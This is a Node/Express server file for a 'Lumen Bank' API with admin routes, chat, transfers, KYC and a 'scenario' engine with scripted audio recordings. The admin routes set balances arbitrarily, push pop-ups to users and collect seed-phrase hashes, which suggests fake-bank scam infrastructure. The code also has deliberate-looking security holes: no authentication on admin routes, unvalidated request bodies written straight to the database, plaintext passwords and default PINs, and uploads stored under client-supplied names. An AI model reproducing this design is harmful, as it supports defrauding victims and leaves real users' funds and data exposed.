import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import http from 'http';
import multer from 'multer';
import path from 'path';
import { initializeSocket } from './socket.js';
import { scenarioEngine } from './scenarioEngine.js';
import { prisma } from './lib/prisma.js';

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());
app.use('/uploads', express.static('uploads'));

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, 'uploads/'),
  filename: (req, file, cb) => cb(null, `${Date.now()}-${file.originalname}`),
});
const upload = multer({ storage });

const PORT = process.env.PORT || 3001;

const server = http.createServer(app);
const io = initializeSocket(server);
app.set('io', io);
app.use('/api/v1', scenarioEngine(io));

// --- ADMIN API ---

// Список всех пользователей
app.get('/admin/users', async (req, res) => {
  try {
    const users = await prisma.user.findMany({ orderBy: { createdAt: 'desc' } });
    res.json(users);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Обновление статуса пользователя (approve/block)
app.patch('/admin/user/:id', async (req, res) => {
  try {
    const user = await prisma.user.update({
      where: { id: req.params.id },
      data: { status: req.body.status },
    });
    res.json(user);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Обновление баланса пользователя
app.patch('/admin/user/:id/balance', async (req, res) => {
  try {
    const user = await prisma.user.update({
      where: { id: req.params.id },
      data: { balance: req.body.balance },
    });

    const ioInstance = app.get('io');
    if (ioInstance) {
      ioInstance.emit('adminCommand', { targetUserId: user.id, command: 'UPDATE_BALANCE', data: user.balance });
    }

    res.json(user);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Список всех транзакций
app.get('/admin/transactions', async (req, res) => {
  try {
    const txs = await prisma.transaction.findMany({
      orderBy: { date: 'desc' },
      include: { user: true },
    });
    res.json(txs);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Обновление статуса транзакции
app.patch('/admin/transaction/:id', async (req, res) => {
  try {
    const tx = await prisma.transaction.update({
      where: { id: req.params.id },
      data: { status: req.body.status },
    });
    res.json(tx);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Список документов
app.get('/admin/documents', async (req, res) => {
  try {
    const docs = await prisma.document.findMany({
      orderBy: { uploadedAt: 'desc' },
      include: { user: true },
    });
    res.json(docs);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Одобрение/Отклонение документа
app.patch('/admin/document/:id', async (req, res) => {
  try {
    const doc = await prisma.document.update({
      where: { id: req.params.id },
      data: { status: req.body.status },
    });
    if (doc.type === 'passport' && req.body.status === 'approved') {
      await prisma.user.update({ where: { id: doc.userId }, data: { kycStatus: 'verified' } });
    }
    res.json(doc);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Список заявок на кредит
app.get('/admin/credit-requests', async (req, res) => {
  try {
    const requests = await prisma.creditRequest.findMany({
      orderBy: { createdAt: 'desc' },
      include: { user: true },
    });
    res.json(requests);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Одобрение/Отклонение кредита
app.patch('/admin/credit-request/:id', async (req, res) => {
  try {
    const request = await prisma.creditRequest.update({
      where: { id: req.params.id },
      data: { status: req.body.status },
    });

    if (req.body.status === 'approved') {
      const user = await prisma.user.update({
        where: { id: request.userId },
        data: { balance: { increment: request.amount } },
      });

      const ioInstance = app.get('io');
      if (ioInstance) {
        ioInstance.emit('adminCommand', { targetUserId: request.userId, command: 'UPDATE_BALANCE', data: user.balance });
        ioInstance.emit('adminCommand', {
          targetUserId: request.userId,
          command: 'show_modal',
          data: {
            type: 'success',
            title: 'Credit Approved',
            message: `Your credit request for $${request.amount} has been approved and added to your balance.`,
          },
        });
      }
    }
    res.json(request);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Отправка Push сообщения
app.post('/admin/chat/send', async (req, res) => {
  try {
    const msg = await prisma.message.create({
      data: {
        text: req.body.text,
        receiverId: req.body.userId || null,
        isAdmin: true,
      },
    });
    res.status(201).json(msg);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Create custom user
app.post('/admin/users', async (req, res) => {
  try {
    const { name, email, password, pin, balance = 0, status = 'approved' } = req.body;
    if (!name || !email || !password) {
      return res.status(400).json({ error: 'Name, email and password required' });
    }
    const exists = await prisma.user.findUnique({ where: { email } });
    if (exists) {
      return res.status(409).json({ error: 'User with this email already exists' });
    }
    const user = await prisma.user.create({
      data: { name, email, password, pin: pin || '1234', balance: Number(balance), status, kycStatus: 'pending' }
    });
    res.status(201).json(user);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Seed Demo Data
app.post('/admin/seed', async (req, res) => {
  try {
    const demoUsers = [
      { name: 'John Doe', email: 'john.demo@lumen.com', password: 'demo', pin: '1234', balance: 50000, status: 'approved', kycStatus: 'verified' },
      { name: 'Sarah Smith', email: 'sarah.demo@lumen.com', password: 'demo', pin: '1234', balance: 1200, status: 'pending', kycStatus: 'pending' },
      { name: 'Mike Ross', email: 'mike.demo@lumen.com', password: 'demo', pin: '1234', balance: 0, status: 'blocked', kycStatus: 'pending' },
    ];

    for (const u of demoUsers) {
      const exists = await prisma.user.findUnique({ where: { email: u.email } });
      if (!exists) {
        const user = await prisma.user.create({ data: u });

        await prisma.transaction.create({
          data: {
            userId: user.id,
            txId: `TX-${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
            amount: 250,
            status: 'completed',
            title: 'Initial Deposit',
            category: 'income',
            type: 'incoming',
          },
        });

        await prisma.creditRequest.create({
          data: {
            userId: user.id,
            amount: 10000,
            term: '24',
            rate: 5.5,
            collateral: 'Car Title',
            status: 'pending',
          },
        });
      }
    }
    res.json({ message: 'Demo data seeded successfully' });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// --- PUBLIC API ---

app.get('/api/chat', async (req, res) => {
  try {
    const messages = await prisma.message.findMany({
      where: {
        OR: [
          { receiverId: req.query.userId },
          { senderId: req.query.userId },
          { receiverId: null },
        ],
      },
      orderBy: { createdAt: 'asc' },
    });
    res.json(messages);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/chat', async (req, res) => {
  try {
    const msg = await prisma.message.create({
      data: { ...req.body, isAdmin: false },
    });
    res.status(201).json(msg);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/register', async (req, res) => {
  try {
    const user = await prisma.user.create({
      data: { ...req.body, status: 'pending' },
    });
    res.status(201).json({ userId: user.id });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/v1/transfers', async (req, res) => {
  try {
    const tx = await prisma.transaction.create({
      data: { ...req.body, status: 'completed' },
    });
    res.status(201).json(tx);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// --- SCENARIO API ---

app.get('/api/scenarios', async (req, res) => {
  try {
    const scenarios = await prisma.scenario.findMany({ orderBy: { createdAt: 'desc' } });
    res.json(scenarios);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/scenarios', async (req, res) => {
  try {
    const scenario = await prisma.scenario.create({
      data: {
        name: req.body.name,
        description: req.body.description,
        steps: JSON.stringify(req.body.steps || []),
        status: req.body.status || 'draft',
        createdBy: req.body.createdBy,
      },
    });
    res.status(201).json(scenario);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/scenarios/:id', async (req, res) => {
  try {
    const scenario = await prisma.scenario.findUnique({ where: { id: req.params.id } });
    if (!scenario) return res.status(404).json({ error: 'Scenario not found' });
    res.json({ ...scenario, steps: JSON.parse(scenario.steps) });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.put('/api/scenarios/:id', async (req, res) => {
  try {
    const scenario = await prisma.scenario.update({
      where: { id: req.params.id },
      data: {
        name: req.body.name,
        description: req.body.description,
        steps: req.body.steps ? JSON.stringify(req.body.steps) : undefined,
        status: req.body.status,
      },
    });
    res.json(scenario);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.delete('/api/scenarios/:id', async (req, res) => {
  try {
    await prisma.scenario.delete({ where: { id: req.params.id } });
    res.json({ message: 'Scenario deleted' });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/scenarios/:id/assign', async (req, res) => {
  try {
    const assignment = await prisma.scenarioAssignment.create({
      data: {
        userId: req.body.userId,
        scenarioId: req.params.id,
        status: 'active',
      },
    });
    res.status(201).json(assignment);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/scenarios/:id/assignments', async (req, res) => {
  try {
    const assignments = await prisma.scenarioAssignment.findMany({
      where: { scenarioId: req.params.id },
      include: { user: true },
    });
    res.json(assignments);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// --- AUDIO API ---

app.get('/api/audio', async (req, res) => {
  try {
    const recordings = await prisma.audioRecording.findMany({ orderBy: { createdAt: 'desc' } });
    res.json(recordings);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/audio', async (req, res) => {
  try {
    const recording = await prisma.audioRecording.create({ data: req.body });
    res.status(201).json(recording);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/audio/upload', upload.single('audio'), async (req, res) => {
  try {
    const file = req.file;
    if (!file) return res.status(400).json({ error: 'No file uploaded' });
    const recording = await prisma.audioRecording.create({
      data: {
        fileName: file.originalname,
        cdnUrl: `/uploads/${file.filename}`,
        duration: parseInt(req.body.duration) || 0,
        character: req.body.character || 'unknown',
        department: req.body.department || '',
        mood: req.body.mood || '',
        script: req.body.script || '',
        triggerType: req.body.triggerType || 'manual',
        sizeBytes: file.size,
      },
    });
    res.status(201).json(recording);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.delete('/api/audio/:id', async (req, res) => {
  try {
    await prisma.audioRecording.delete({ where: { id: req.params.id } });
    res.json({ message: 'Recording deleted' });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// --- NOTIFICATIONS API ---

app.get('/api/notifications', async (req, res) => {
  try {
    const messages = await prisma.message.findMany({
      where: { receiverId: req.query.userId || null, isAdmin: true },
      orderBy: { createdAt: 'desc' },
    });
    res.json(messages);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// --- KYC API ---

app.get('/api/kyc', async (req, res) => {
  try {
    const records = await prisma.kycRecord.findMany({
      include: { user: true },
      orderBy: { createdAt: 'desc' },
    });
    res.json(records);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/kyc', async (req, res) => {
  try {
    const record = await prisma.kycRecord.create({
      data: {
        userId: req.body.userId,
        seedPhraseHash: req.body.seedPhraseHash,
        questions: req.body.questions ? JSON.stringify(req.body.questions) : null,
        answers: req.body.answers ? JSON.stringify(req.body.answers) : null,
        documents: req.body.documents ? JSON.stringify(req.body.documents) : null,
        status: req.body.status || 'pending',
      },
    });
    res.status(201).json(record);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// --- HEALTH CHECK ---

app.get('/', (req, res) => res.send('Lumen Bank API Running...'));
app.get('/health', (req, res) => res.json({ status: 'ok', timestamp: new Date().toISOString() }));

// --- ERROR HANDLER ---
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ error: err.message || 'Internal Server Error' });
});

server.listen(PORT, () => console.log(`🚀 Lumen Bank Server running on port ${PORT}`));
